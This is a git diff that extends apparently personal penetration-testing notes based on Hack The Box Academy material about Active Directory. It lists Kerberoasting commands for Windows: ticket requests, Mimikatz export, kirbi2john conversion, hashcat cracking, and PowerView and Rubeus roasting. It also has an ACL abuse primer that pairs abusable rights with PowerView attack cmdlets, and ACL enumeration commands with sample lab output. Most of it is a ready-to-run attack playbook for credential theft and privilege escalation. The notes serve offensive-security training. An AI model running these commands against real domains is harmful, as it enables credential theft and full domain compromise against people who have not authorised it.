@@ -861,3 +861,274 @@ hashcat:
 hashcat -m 13100 kerberoasting.txt {WORDLIST}
 ```
 
+## Kerberoasting - from Windows
+
+**Tools:**
+
+- Setspn.exe
+- Add-Type and New-Object
+- Mimikatz
+- kirbi2john.py
+- hashcat
+- Powerview
+- Rubeus
+
+**Commands:**
+
+Setspn.exe  - Enumerate SPNs: 
+
+```cmd
+setspn.exe -Q */*
+```
+
+Setspn.exe - Retrieve All Tickets:
+
+```cmd
+setspn.exe -T {DOMAIN} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+Add-Type and New-Object (request TGS tickets for an account in the shell above and load them into memory):
+
+```Powershell
+PS C:\> Add-Type -AssemblyName System.IdentityModel
+PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{SPN}"
+Example: PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+Mimikatz - Extract Tickets from Memory (base64):
+
+```cmd
+mimikatz # base64 /out:true
+mimikatz # kerberos::list /export
+```
+
+**NOTE:** Use this command if you extract in b64 to remove line breaks: `echo "<base64 ticket>" |  tr -d \\n > encoded_file`
+
+Placing the Output into a File as .kirbi:
+
+```bash
+cat encoded_file | base64 -d > file.kirbi
+```
+
+Extracting the Kerberos Ticket using kirbi2john.py:
+
+```bash
+kirbi2john.py file.kirbi
+```
+
+hashcat:
+
+```bash
+hashcat -m 13100 {FILE} {WORDLIST}
+```
+
+Mimikatz - Extract Tickets from Memory: 
+
+```cmd
+mimikatz # kerberos::list /export
+```
+
+Extracting the Kerberos Ticket using kirbi2john.py:
+
+```bash
+kirbi2john.py file.kirbi
+```
+
+hashcat:
+
+```bash
+hashcat -m 13100 {FILE} {WORDLIST}
+```
+
+PowerView - Extract TGS Tickets:
+
+```powershell
+PS C:\> Import-Module .\PowerView.ps1
+PS C:\> Get-DomainUser * -spn | select samaccountname
+PS C:\> Get-DomainUser -Identity {SPN_USER} | Get-DomainSPNTicket -Format Hashcat
+```
+
+PowerView - Extract All TGS Tickets to a CSV file:
+
+```powershell
+PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\file.csv -NoTypeInformation
+```
+
+Rubeus.exe - Kerberoasting Info:
+
+```powershell
+PS C:\> .\Rubeus.exe kerberoast /stats
+```
+
+Rubeus.exe - Filter and retrieve admin accounts:
+
+```powershell
+PS C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+**NOTE:** Use `/nowrap` to print the ticket in one single line.
+
+Rubeus.exe - Specify an user account:
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /user:{USER} /nowrap
+```
+
+Rubeus.exe - Specify SPN:
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /spn:"{SPN}" /nowrap
+```
+
+# An ACE in the Hole
+
+## Access Control List (ACL) Abuse Primer
+
+### Access Control List (ACL) Overview
+
+In their simplest form, ACLs are lists that define a) who has access  to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every  object has an ACL, but can have multiple ACEs because multiple security  principals can access objects in AD. ACLs can also be used for auditing  access within AD.
+
+There are two types of ACLs:
+
+1. `Discretionary Access Control List` (`DACL`) -  defines which security principals are granted or denied access to an  object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL  for the level of access that is permitted. If a DACL does not exist for  an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
+2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.
+
+### Access Control Entries (ACEs)
+
+As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a  given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:
+
+| **ACE**              | **Description**                                              |
+| -------------------- | ------------------------------------------------------------ |
+| `Access denied ACE`  | Used within a DACL to show that a user or group is explicitly denied access to an object |
+| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object |
+| `System audit ACE`   | Used within a SACL to generate audit logs when a user or group  attempts to access an object. It records whether access was granted or  not and what type of access occurred |
+
+Each ACE is made up of the following `four` components:
+
+1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
+2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
+3. A set of flags that specify whether or not child containers/objects  can inherit the given ACE entry from the primary or parent object
+4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object
+
+### Why are ACEs Important?
+
+Attackers utilize ACE entries to either further access or establish  persistence. These can be great for us as penetration testers as many  organizations are unaware of the ACEs applied to each object or the  impact that these can have if applied incorrectly. They cannot be  detected by vulnerability scanning tools, and often go unchecked for  many years, especially in large and complex environments. During an  assessment where the client has taken care of all of the "low hanging  fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us  to move laterally/vertically and even achieve full domain compromise.  Some example Active Directory object security permissions are as  follows. These can be enumerated (and visualized) using a tool such as  BloodHound, and are all abusable with PowerView, among other tools:
+
+- `ForceChangePassword` abused with `Set-DomainUserPassword`
+- `Add Members` abused with `Add-DomainGroupMember`
+- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
+- `GenericWrite` abused with `Set-DomainObject`
+- `WriteOwner` abused with `Set-DomainObjectOwner`
+- `WriteDACL` abused with `Add-DomainObjectACL`
+- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
+- `Addself` abused with `Add-DomainGroupMember`
+
+In this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:
+
+- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) - gives us the right to reset a user's password without first knowing  their password (should be used cautiously and typically best to consult  our client before resetting passwords).
+- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) - gives us the right to write to any non-protected attribute on an  object. If we have this access over a user, we could assign them an SPN  and perform a Kerberoasting attack (which relies on the target account  having a weak password set). Over a group means we could add ourselves  or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based  constrained delegation attack which is outside the scope of this module.
+- `AddSelf` - shows security groups that a user can add themselves to.
+- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group  membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain  local admin access to the machine which may aid us in lateral movement  or privilege escalation in the domain if we can obtain privileged  controls or gain some sort of privileged access.
+
+![image](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)
+
+## ACL Enumeration
+
+**Tools:**
+
+- PowerView
+- Bloodhound
+
+**Commands:**
+
+Find-InterestingDomainAcl - Enumerate ALL ACLs (extremely time-consuming and likely inaccurate):
+
+```powershell
+PS C:\> Find-InterestingDomainAcl
+```
+
+Get-DomainObjectACL - Enumerate a specific object and retrieve GUID value from "ObjectAceType" (GUID):
+
+```powershell
+PS C:\> Import-Module .\PowerView.ps1
+PS C:\> $sid = Convert-NameToSid {OBJECT}
+PS C:\> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+Example:
+
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 256
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AceType                : AccessAllowedObject
+AceFlags               : ContainerInherit
+IsInherited            : False
+InheritanceFlags       : ContainerInherit
+PropagationFlags       : None
+AuditFlags             : None
+```
+
+**NOTE:** In the example above, the GUID is "00299570-246d-11d0-a768-00aa006e0529". With the GUID, we can search the value on google or perform a reverse search using the command below.
+
+Performing a Reverse Search & Mapping to a GUID Value:
+
+```powershell
+PS C:\htb> $guid= "{GUID}"
+PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+
+Example:
+
+PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
+PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+
+Name              : User-Force-Change-Password
+DisplayName       : Reset Password
+DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
+```
+
+Get-DomainObjectACL - Enumerate a specific object and retrieve GUID value from "ObjectAceType" (Human-Readable):
+
+```powershell
+PS C:\> Import-Module .\PowerView.ps1
+PS C:\> $sid = Convert-NameToSid {OBJECT}
+PS C:\> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+
+Example:
+
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : User-Force-Change-Password
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+```
+
